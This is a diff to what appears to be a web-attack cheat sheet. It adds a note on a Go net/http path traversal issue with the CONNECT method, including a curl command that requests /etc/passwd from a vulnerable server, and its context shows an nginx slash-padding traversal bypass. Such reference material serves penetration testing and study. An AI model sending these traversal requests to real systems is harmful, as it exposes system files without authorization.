@@ -98,8 +98,19 @@ NGINX in certain configurations and ALB can block traversal attacks in the route
 To bypass this behaviour just add forward slashes in front of the url:
 ```http://nginx-server////////../../```
 
-
 ## Path Traversal
+
+### Go net/http path traversal bug
+Go net/http server doesn't sanitize the request path with `CONNECT` method, so attacker can exploit with the following request.
+
+```bash
+curl --path-as-is -X CONNECT http://vulnerable.server/../../../etc/passwd
+```
+
+Refs:
+- https://ilyaglotov.com/blog/servemux-and-path-traversal
+- https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364
+- https://ctftime.org/writeup/25852
 
 ### Interesting Linux files
 
